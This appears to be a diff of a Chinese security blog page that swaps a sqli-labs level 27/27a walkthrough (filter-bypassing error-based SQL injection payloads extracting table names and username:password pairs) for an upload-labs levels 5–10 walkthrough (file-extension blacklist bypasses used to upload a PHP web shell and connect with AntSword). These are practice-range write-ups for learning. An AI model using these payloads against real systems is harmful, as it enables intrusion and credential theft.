@@ -21,21 +21,21 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":false,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="前言相比之前并没有大的变化，照猫画虎罢了">
+  <meta name="description" content="前言刚翻过了一座山，又遇到了一条河。bug的问题真伤脑筋…这三关比较像，所以一起写了。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sqli-labs_27+27a">
-<meta property="og:url" content="http://example.com/2022/11/17/sqli-labs_27+27a/index.html">
+<meta property="og:title" content="upload-labs_5-10">
+<meta property="og:url" content="http://example.com/2022/11/25/upload-labs_5-10/index.html">
 <meta property="og:site_name" content="Scammer">
-<meta property="og:description" content="前言相比之前并没有大的变化，照猫画虎罢了">
+<meta property="og:description" content="前言刚翻过了一座山，又遇到了一条河。bug的问题真伤脑筋…这三关比较像，所以一起写了。">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2022-11-16T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-11-17T09:51:23.912Z">
+<meta property="article:published_time" content="2022-11-24T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-11-25T16:07:56.943Z">
 <meta property="article:author" content="Bron">
-<meta property="article:tag" content="SQL注入">
-<meta property="article:tag" content="sqli-labs">
+<meta property="article:tag" content="upload-labs">
+<meta property="article:tag" content="蚁剑">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="http://example.com/2022/11/17/sqli-labs_27+27a/">
+<link rel="canonical" href="http://example.com/2022/11/25/upload-labs_5-10/">
 
 
 <script id="page-configurations">
@@ -48,7 +48,7 @@
   };
 </script>
 <link rel="stylesheet" type="text/css" href="/css/injector/main.css" /><link rel="preload" as="style" href="/css/injector/light.css" /><link rel="preload" as="style" href="/css/injector/dark.css" />
-  <title>sqli-labs_27+27a | Scammer</title>
+  <title>upload-labs_5-10 | Scammer</title>
   
 
 
@@ -194,7 +194,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/17/sqli-labs_27+27a/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/25/upload-labs_5-10/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/Elaina.png">
@@ -207,7 +207,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          sqli-labs_27+27a
+          upload-labs_5-10
         </h1>
 
         <div class="post-meta">
@@ -216,21 +216,23 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-11-17 00:00:00 / 修改时间：17:51:23" itemprop="dateCreated datePublished" datetime="2022-11-17T00:00:00+08:00">2022-11-17</time>
+              <time title="创建时间：2022-11-25 00:00:00" itemprop="dateCreated datePublished" datetime="2022-11-25T00:00:00+08:00">2022-11-25</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-11-26 00:07:56" itemprop="dateModified" datetime="2022-11-26T00:07:56+08:00">2022-11-26</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/SQL%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">SQL注入</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/SQL%E6%B3%A8%E5%85%A5/sqli-labs/" itemprop="url" rel="index"><span itemprop="name">sqli-labs</span></a>
+                  <a href="/categories/upload-labs/" itemprop="url" rel="index"><span itemprop="name">upload-labs</span></a>
                 </span>
             </span>
 
@@ -247,14 +249,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>1.7k</span>
+              <span>519</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
+              <span>1 分钟</span>
             </span>
 
         </div>
@@ -266,29 +268,26 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>相比之前并没有大的变化，照猫画虎罢了</p>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>刚翻过了一座山，又遇到了一条河。bug的问题真伤脑筋…<br>这三关比较像，所以一起写了。</p>
 <span id="more"></span>
-
-<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li><p>测试并判断注入类型<br>本关通过查看源码可知，select和union被过滤了，但and和or这次没被过滤</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out UNION</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out SELECT</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out Union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>问题不大，可以通过大小写或重写绕过</p>
-</li>
-<li><p>获取当前数据库名和数据库版本号</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(database())),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(version())),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆表</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;security&#x27;),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆字段名</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;users&#x27;),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆数据</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(concat(username,&#x27;:&#x27;,password))from(users)limit%0b0,1)),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="第27a关"><a href="#第27a关" class="headerlink" title="第27a关"></a>第27a关</h2><p>与27关相比，只是闭合方式变更为”</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>a piece of cake~</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
+<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="第5关"><a href="#第5关" class="headerlink" title="第5关"></a>第5关</h2><p><strong>黑名单过滤（后缀名特殊字符多写）</strong><br>尝试其它都无法成功，因此选择特殊字符重写</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b.php. .         在php后加一个点，加一个空格，再加一个点，上传成功</span><br></pre></td></tr></table></figure>
+<p>蚁剑按正常后缀连接成功。</p>
+<h2 id="第6关"><a href="#第6关" class="headerlink" title="第6关"></a>第6关</h2><p><strong>黑名单过滤（大小写绕过）</strong><br>尝试其它都无法成功，因此选择大小写绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b.Php            任意改变php的大小写，上传成功</span><br></pre></td></tr></table></figure>
+<p>正常情况下，蚁剑按正常后缀连接成功<br>PS: 我的出问题了，文件能上传，但打开文件时会出现HTTP500错误，没有找到原因，只能重装phpstudy解决</p>
+<h2 id="第7关"><a href="#第7关" class="headerlink" title="第7关"></a>第7关</h2><p><strong>黑名单过滤（空格绕过）</strong><br>尝试其它都无法成功，因此选择空格绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b.php            在php后加一个空格，上传成功</span><br></pre></td></tr></table></figure>
+<p>蚁剑按正常后缀连接成功</p>
+<h2 id="第8关"><a href="#第8关" class="headerlink" title="第8关"></a>第8关</h2><p><strong>黑名单过滤（点绕过）</strong><br>尝试其它都无法成功，因此选择点绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b.php.          在php后加一个点，上传成功</span><br></pre></td></tr></table></figure>
+<p>蚁剑按正常后缀连接成功</p>
+<h2 id="第9关"><a href="#第9关" class="headerlink" title="第9关"></a>第9关</h2><p><strong>黑名单过滤（流文件绕过）</strong><br>尝试其它都无法成功，因此选择流文件绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b.php::$DATA    在php后加::$DATA，上传成功</span><br></pre></td></tr></table></figure>
+<p>蚁剑按正常后缀连接成功</p>
+<h2 id="第10关"><a href="#第10关" class="headerlink" title="第10关"></a>第10关</h2><p>方法和第5关相同，不过多叙述</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>遇事不决，重装解决</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Thunderclap_/article/details/108948611">upload-labs文件上传靶场实验通关教程攻略</a></p>
 
     </div>
 
@@ -314,7 +313,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="http://example.com/2022/11/17/sqli-labs_27+27a/" title="sqli-labs_27+27a">http://example.com/2022/11/17/sqli-labs_27+27a/</a>
+    <a href="http://example.com/2022/11/25/upload-labs_5-10/" title="upload-labs_5-10">http://example.com/2022/11/25/upload-labs_5-10/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -365,8 +364,8 @@
       <footer class="post-footer">
           
           <div class="post-tags">
-              <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"><i class="fa fa-tag"></i> SQL注入</a>
-              <a href="/tags/sqli-labs/" rel="tag"><i class="fa fa-tag"></i> sqli-labs</a>
+              <a href="/tags/upload-labs/" rel="tag"><i class="fa fa-tag"></i> upload-labs</a>
+              <a href="/tags/%E8%9A%81%E5%89%91/" rel="tag"><i class="fa fa-tag"></i> 蚁剑</a>
           </div>
 
         
@@ -375,12 +374,12 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2022/11/17/sqli-labs_28+28a/" rel="prev" title="sqli-labs_28">
-      <i class="fa fa-chevron-left"></i> sqli-labs_28
+    <a href="/2022/11/24/Diary_1124/" rel="prev" title="是非成败转头空">
+      <i class="fa fa-chevron-left"></i> 是非成败转头空
     </a></div>
       <div class="post-nav-item">
-    <a href="/2022/11/17/sqli-labs_26+26a/" rel="next" title="sqli-labs_26+26a">
-      sqli-labs_26+26a <i class="fa fa-chevron-right"></i>
+    <a href="/2022/11/25/Diary_1125/" rel="next" title="">
+       <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -440,7 +439,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A7%A3%E5%86%B3%E6%AD%A5%E9%AA%A4"><span class="nav-number">2.</span> <span class="nav-text">解决步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC27a%E5%85%B3"><span class="nav-number">2.1.</span> <span class="nav-text">第27a关</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%90%8E%E8%AE%B0"><span class="nav-number">3.</span> <span class="nav-text">后记</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%87%B4%E8%B0%A2"><span class="nav-number">4.</span> <span class="nav-text">致谢</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A7%A3%E5%86%B3%E6%AD%A5%E9%AA%A4"><span class="nav-number">2.</span> <span class="nav-text">解决步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC5%E5%85%B3"><span class="nav-number">2.1.</span> <span class="nav-text">第5关</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC6%E5%85%B3"><span class="nav-number">2.2.</span> <span class="nav-text">第6关</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC7%E5%85%B3"><span class="nav-number">2.3.</span> <span class="nav-text">第7关</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC8%E5%85%B3"><span class="nav-number">2.4.</span> <span class="nav-text">第8关</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC9%E5%85%B3"><span class="nav-number">2.5.</span> <span class="nav-text">第9关</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC10%E5%85%B3"><span class="nav-number">2.6.</span> <span class="nav-text">第10关</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%90%8E%E8%AE%B0"><span class="nav-number">3.</span> <span class="nav-text">后记</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%87%B4%E8%B0%A2"><span class="nav-number">4.</span> <span class="nav-text">致谢</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
